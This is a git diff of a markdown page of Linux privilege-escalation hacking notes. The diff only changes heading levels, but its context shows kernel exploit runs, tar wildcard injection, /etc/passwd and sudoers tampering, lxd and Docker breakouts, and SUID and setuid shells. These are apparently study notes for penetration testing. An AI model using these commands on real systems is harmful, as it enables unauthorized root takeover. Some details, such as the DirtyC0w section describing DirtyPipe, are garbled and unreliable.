@@ -4,14 +4,14 @@ title: Linux Privesc
 
 Privilege Escalation usually involves going from a lower permission to a higher permission.
 
-# Enumeration Scripts:
+## Enumeration Scripts:
 
 There are some scripts that could help us in order to escalate privilege on Linux systems. These are two examples:
 
 * **LinEnum**: [https://github.com/rebootuser/LinEnum/](https://github.com/rebootuser/LinEnum/)
 * **LinPEAS**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)/
 
-# Kernel Vulnerabilities
+## Kernel Vulnerabilities
 
 We can exploit some kernel vulnerabilities in order to privesc. `linux-exploit-suggester.sh` is an amazing script that do this work.
 
@@ -21,7 +21,7 @@ We can exploit some kernel vulnerabilities in order to privesc. `linux-exploit-s
 ./linux-exploit-suggester.sh
 ```
 
-## Compiling Exploits
+### Compiling Exploits
 
 Sometimes we need to compile our exploits in order to get the binary or executable.
 
@@ -47,7 +47,7 @@ chmod u+x executablename
 ./executablename
 ```
 
-## DirtyPipe - Linux Kernel <= 5.8
+### DirtyPipe - Linux Kernel <= 5.8
 
 `DirtyPipe` allows overwriting data in arbitrary read-only files that leverages to a privilege escalation due to unprivileged process can inject code into root processes. It is similar to `DirtyC0w`.
 
@@ -65,7 +65,7 @@ Transfer the exploit to the target machine and execute it.
 * [https://github.com/rahul1406/cve-2022-0847dirtypipe-exploit](https://github.com/rahul1406/cve-2022-0847dirtypipe-exploit)
 
 
-## eBPF\_verifier - Linux Kernel < 4.13.9
+### eBPF\_verifier - Linux Kernel < 4.13.9
 
 ```bash
 $ gcc cve-2017-16995.c -o cve-2017-16995
@@ -95,7 +95,7 @@ uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
 * [https://www.exploit-db.com/exploits/45010](https://www.exploit-db.com/exploits/45010)
 
-## DirtyC0w - Linux Kernel 2.6.22 < 3.9
+### DirtyC0w - Linux Kernel 2.6.22 < 3.9
 
 `DirtyPipe` allows overwriting data in arbitrary read-only files that leverages to a privilege escalation.
 
@@ -112,7 +112,7 @@ chmod +x dirty
 
 * [https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
 
-## Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
+### Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
 
 ```bash
 $ gcc mempodipper.c -o mempodipper
@@ -143,7 +143,7 @@ root
 
 * [https://www.exploit-db.com/exploits/18411](https://www.exploit-db.com/exploits/18411)
 
-## Abusing SUID/GUID Files
+### Abusing SUID/GUID Files
 
 Check for files with the SUID/GUID bit set. This means that the file or files can be **run with permissions of the file(s) owner/group**. In case of super-user, we can leverage this to get a shell with these privileges.
 
@@ -159,14 +159,14 @@ But when a special permission is given to each user it becomes SUID or SGID. Whe
 
 ![SUID, SGID and Sticky Bit](../images/suid.png)
 
-## **Finding SUID / GUID Binaries:**
+### **Finding SUID / GUID Binaries:**
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 find / -perm -g=s -type f 2>/dev/null
 ```
 
-## Exploiting PATH Variable
+### Exploiting PATH Variable
 
 `PATH` is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the `PATH` Variable in response to commands executed by a user.
 
@@ -190,23 +190,23 @@ Finally when the SUID files calls `ps` function, instead of showing system proce
 
 > **Remember**: To exploit PATH variable **we need a SUID File** to gain privileges otherwise it will be executed as normal user.
 
-# Writeable Folders
+## Writeable Folders
 
 We can elevate our privileges some times when we have write permissions in some specific directories.
 
 > **Note**: With write permissions on the folder we can **create/delete/move files** but not modify them.
 
-## On PATH variable
+### On PATH variable
 
 When we can write on folders such as `/usr/local/bin` `/usr/bin` or some others that are included on the PATH variable we can escalate our privileges by **modifying or creating a new binary** that will be executed as **root**.
 
-### SSH port open
+#### SSH port open
 
 When we ssh a machine root executes `run-parts` binary so we add a malicious binary on the path. Look [Executing files with root ](https://mvc1009.gitbook.io/hackingnotes/privilege-escalation/linux-privesc#executing-files-with-root)to see which binary we can fit our needs.
 
-# Abusing Wildcards (\*)
+## Abusing Wildcards (\*)
 
-## Tar Argument Injection in root cronjob
+### Tar Argument Injection in root cronjob
 
 Imagine you compromise a low-level user on a system and you figure out this command is running as root:
 
@@ -222,7 +222,7 @@ echo "" > "--checkpoint-action=exec=sh privesc.sh"
 echo "" > --checkpoint=1
 ```
 
-# Writeable /etc/passwd
+## Writeable /etc/passwd
 
 The `/etc/passwd` file stores essential information, which is required during login. In other words, it stores user account information.
 
@@ -245,7 +245,7 @@ And finally su to this new user to obtain a **root** **shell**:
 su [USERNAME]
 ```
 
-# GTFOBins
+## GTFOBins
 
 GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
 
@@ -266,7 +266,7 @@ User user may run the following commands on armageddon:
 
 > **Remember**: Do **not** **forget** to run the command as **sudo!**
 
-## SETENV permission
+### SETENV permission
 
 This mean that we can set some environment variables to run the command.
 
@@ -301,7 +301,7 @@ rev-4.4# id
 uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
 ```
 
-## Snap install
+### Snap install
 
 ```bash
 User user may run the following commands on armageddon:
@@ -351,7 +351,7 @@ parts:
     plugin: nil
 ```
 
-# Linux Capabilities
+## Linux Capabilities
 
 > Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.
 
@@ -369,7 +369,7 @@ More info in:
 
 * [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
 
-# Exploiting Crontab
+## Exploiting Crontab
 
 The `Cron` daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as on-time events or as recurring tasks.
 
@@ -381,9 +381,9 @@ cat /etc/crontab
 
 If we find a script that is scheduled to run as user root and we can write to this file, we can modify it to get a reverse shell when the cronjob run the task.
 
-# Abusing privileges (Group memberships)
+## Abusing privileges (Group memberships)
 
-## sudo
+### sudo
 
 Thats it, you're already root:
 
@@ -391,11 +391,11 @@ Thats it, you're already root:
 sudo su -
 ```
 
-## lxd
+### lxd
 
 A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.
 
-### With Internet
+#### With Internet
 
 ```bash
 lxc init ubuntu:16:04 myimage -c security.privileged=true
@@ -404,7 +404,7 @@ lxc start test
 lxc exec test bash
 ```
 
-### Without Internet
+#### Without Internet
 
 Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
 
@@ -443,7 +443,7 @@ lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
 
-## adm
+### adm
 
 All members of the group `admin` have access to logs files:
 
@@ -451,7 +451,7 @@ All members of the group `admin` have access to logs files:
 /var/log/
 ```
 
-## disk
+### disk
 
 All members of the gorup `disk` have full access to the filesystem.
 
@@ -473,7 +473,7 @@ debugfs: dump file1.txt file2.txt  #Copy file1.txt to file2.txt
 
 > **Hint**: Files owned by root are now writable such as `/etc/passwd` or `/etc/shadow`.
 
-## video
+### video
 
 The video group has access to view the screen output of all opened sessions (tty). With `w` command we can see the who is logged on the server:
 
@@ -498,7 +498,7 @@ Finally we can open the data with GIMP.
 
 ![](../images/video.png)
 
-## docker
+### docker
 
 Since we are member of docker group, we can mount the root filesystem of the host machine to an instance's volume.
 
@@ -520,9 +520,9 @@ We can also mount the filesystem and the network access.
 $ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
 
-# Docker Breakout
+## Docker Breakout
 
-## Privileged Flag enabled
+### Privileged Flag enabled
 
 When we start a docker with the privileged flag `--privileged` , we give the sufficient permission to mount the host filesystem inside the docker.
 
@@ -541,29 +541,29 @@ mount /dev/sda1 /mnt/host_drive
 
 Finally, just `cd` to out new mount point to find all host files.
 
-## Docker.sock available
+### Docker.sock available
 
 By default, when the `docker` command is executed on a host, an API call to the docker daemon is made via a non-networked UNIX socket located at `/var/run/docker.sock`. However, many containers and guides require you to expose this socket file as a volume within a container or in some cases, expose it on a TCP port. Docker containers that expose `/var/run/docker.sock`, locally or remotely, could lead to a full environment take over.
 
-### Check if socket is available
+#### Check if socket is available
 
 ```bash
 ls -alh /var/run/docker.sock
 ```
 
-### List all containers
+#### List all containers
 
 ```bash
 curl -ik --unix-socket /var/run/docker.sock http://<docker_host>:PORT/containers/json
 ```
 
-### Create an exec
+#### Create an exec
 
 ```bash
 curl -ik -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://<docker_host>:PORT/containers/<container_id>/exec
 ```
 
-### Start the exec
+#### Start the exec
 
 ```bash
 curl -ik -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" --data-binary '{"Detach": false,"Tty": true} http://<docker_host>:PORT/exec/<exec_id>/start' 
@@ -571,7 +571,7 @@ curl -ik -X POST --unix-socket /var/run/docker.sock -H "Content-Type: applicatio
 
 * [https://dejandayoff.com/the-danger-of-exposing-docker.sock/](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)
 
-# USBCreator D-Bus
+## USBCreator D-Bus
 
 A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the **sudoer group to bypass the password** security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – **without supplying a password.**
 
@@ -581,9 +581,9 @@ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCr
 
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
-# Executing files with root
+## Executing files with root
 
-## Adding a new SUDOER user (Bash)
+### Adding a new SUDOER user (Bash)
 
 We can create a new user and add it to the sudoers file:
 
@@ -595,7 +595,7 @@ usermod -aG sudo dirty_sock
 echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
 ```
 
-## Creating a SUID shell (bash)
+### Creating a SUID shell (bash)
 
 We can copy the bash file to temp and give it SUID permissions.
 
@@ -606,7 +606,7 @@ chmod u+s /tmp/bash
 /tmp/bash -p
 ```
 
-## Creating a SUID file (c)
+### Creating a SUID file (c)
 
 ```c
 #include <unistd.h>
@@ -618,7 +618,7 @@ int main()
 }
 ```
 
-## Creating a SUID shell (C)
+### Creating a SUID shell (C)
 
 We can write the following C code in order to obtain a bash shell:
 
@@ -645,7 +645,7 @@ Finally we need to transfer the file with the command execution.
 /tmp/shell -p
 ```
 
-# Capabilities
+## Capabilities
 
 Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.
 
@@ -655,13 +655,13 @@ Search files with capabilities:
 getcap -r / 2>/dev/null
 ```
 
-## Python Capability
+### Python Capability
 
 ```bash
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-# References:
+## References:
 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 * [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html)
